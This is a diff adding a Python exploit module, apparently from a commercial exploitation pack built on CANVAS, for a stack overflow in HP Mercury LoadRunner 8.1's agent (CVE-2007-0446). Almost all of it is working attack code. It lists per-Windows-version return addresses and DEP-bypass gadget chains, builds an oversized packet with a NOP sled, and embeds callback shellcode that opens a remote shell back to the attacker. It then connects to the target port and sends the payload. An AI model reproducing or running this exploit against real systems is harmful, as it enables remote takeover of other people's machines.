@@ -1,0 +1,169 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+
+import sys
+import random
+
+if "." not in sys.path: 
+		sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "HP Mercury LoadRunner 8.1 - Agent Stack Overflow"
+
+DESCRIPTION = "Stack overflow vulnerability in HP Mercury LoadRunner 8.1 Agent"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2007.02.08"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-07-007.html"
+DOCUMENTATION["VersionsAffected"] = "HP Mercury LoadRunner 8.1"
+DOCUMENTATION["CVE Name"] = "CVE-2007-0446"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0446"
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "XP", "2003" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0: [ "Windows 2000 SP4 English", 0x7839b161],  # call [esi+4]
+    1: [ "Windows 2003 SP0 English", 0x77bb2da8],  # call [esi+4]         
+    2: [ "Windows XP   SP2 English (DEP)", 0x77c57b1c, 0x7cbb3fdc, 0x77c51931, 0x77c4d230, 0x7c91d3f8, 0x7c95eff3 ], # anti-dep    
+    3: [ "Windows 2003 SP1 English (DEP)", 0x77be8e54, 0x7c985842, 0x77be2b91, 0x77bde250, 0x7c83e413, 0x77e6334b ], # anti-dep
+    4: [ "Windows 2003 SP2 English (DEP)", 0x77be8e54, 0x7cac9b5a, 0x77be2b91, 0x77bde250, 0x7c83f517, 0x77eb4303 ], # anti-dep    
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.port = 54345
+        self.version = 1        
+        self.badstring = "\x00\x0a\x0d\x5b\x5d\x28\x29\x3d"
+        return
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]
+        
+    def createShellcode(self):
+				return self.createSmallWin32Shellcode(self.callback.ip, self.callback.port, subesp = 1000)		    
+
+    def run(self):
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                        
+        s = self.gettcpsock()
+        s.connect((self.host, self.port))
+                
+        s.sendall("\x00\x00\x00\x19" + ("A" * 25))
+        s.sendall(sploitstring)                  
+
+        if self.ISucceeded():
+            self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+            self.log("%s done (succeeded!)" % self.name)
+            return 1
+        
+        return 0    
+        
+    def makesploit(self):
+        """
+        Construct the attack        			  
+				
+				"""        								
+        if (self.version >= 2): # Windows XP SP2 / Windows 2003 SP1/SP2          					
+					os_name, pop_ret, anti_dep_1, anti_dep_2, anti_dep_3, anti_dep_4, call_esp = targets[self.version]
+        
+					total_len = "\x00\x00\x06\xce"
+					data_1 = "\x00\x00\x00\x1c\x00\x00\x00\x05\x00\x00\x00\x01\x95\x9c\x3d\xa7\xc4\x1c\xcb\x47\xa4\x92\xc8\xa1\xa1\x2b\x5b\xb6"
+					sub_len_1 = "\x00\x00\x06\xb2"
+					data_2 = "\x00\x00\x00\x07\x00\x00\x00\x12\x6d\x65\x72\x63\x75\x72\x79\x32\x3b\x31\x33\x30\x34\x3b\x31\x33\x30\x30\x00\x00"
+					sub_len_2 = "\x00\x00\x06\x88"
+					data_3 = "\x90" * 1156					
+					data_4 = "\x90" * 520
+										
+					tmp = data_4[0:8]
+					tmp += self.shellcode
+					tmp += data_4[8 + len(self.shellcode):]
+										
+					# pop @ 0x77c27b1c
+					# push esp / pop ebp /ret @ 0x7cbc3fdc
+					# mov eax,1 0x77c21931
+					# add esp,14 @ 0x77c1d230
+					# anti-dep @ 0x70a77b23
+					# call esp @ 0x7c5749b7
+					#
+					pr = str(struct.pack('<L', pop_ret))
+					ad1 = str(struct.pack('<L', anti_dep_1))
+					ad2 = str(struct.pack('<L', anti_dep_2))
+					ad3 = str(struct.pack('<L', anti_dep_3))				
+					ad4 = str(struct.pack('<L', anti_dep_4))
+					ret = str(struct.pack('<L', call_esp))
+																				
+					sploitstring = total_len + data_1 + sub_len_1 + data_2 + sub_len_2 + data_3 + pr + "\xff\xff\xff\xff" + ad1 + ad2 + ad3 + ("\xff"*20) + ad4 + ret + tmp
+																				
+        else:                   # Windows 2000 / Windows XP SP1 / Windows 2003 SP0        	
+					os_name, call_esp = targets[self.version]
+					
+					total_len = "\x00\x00\x05\xce"
+					data_1 = "\x00\x00\x00\x1c\x00\x00\x00\x05\x00\x00\x00\x01\x95\x9c\x3d\xa7\xc4\x1c\xcb\x47\xa4\x92\xc8\xa1\xa1\x2b\x5b\xb6"
+					sub_len_1 = "\x00\x00\x05\xb2"
+					data_2 = "\x00\x00\x00\x07\x00\x00\x00\x12\x6d\x65\x72\x63\x75\x72\x79\x32\x3b\x31\x33\x30\x34\x3b\x31\x33\x30\x30\x00\x00"
+					sub_len_2 = "\x00\x00\x05\x88"
+					data_3 = "\x90" * 1156
+					ret = str(struct.pack('<L', call_esp))
+					data_4 = "A" * 264					
+					
+					tmp = data_3[0:4]
+					tmp += self.shellcode
+					tmp += data_3[4 + len(self.shellcode):]
+					
+					sploitstring = total_len + data_1 + sub_len_1 + data_2 + sub_len_2 + tmp + ret + data_4															      	        						
+  		
+        return sploitstring
+        		
+    def usage(self):        
+        print "Usage: %s -v version -t host -l localip -d localport\n" % sys.argv[0]
+        
+        i = 0
+        
+        print 'Available versions:'
+        
+        for listline in targets.values():
+            print '\t%d: %s'%(i, listline[0])
+            i = i + 1
+        
+        sys.exit(0) 
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
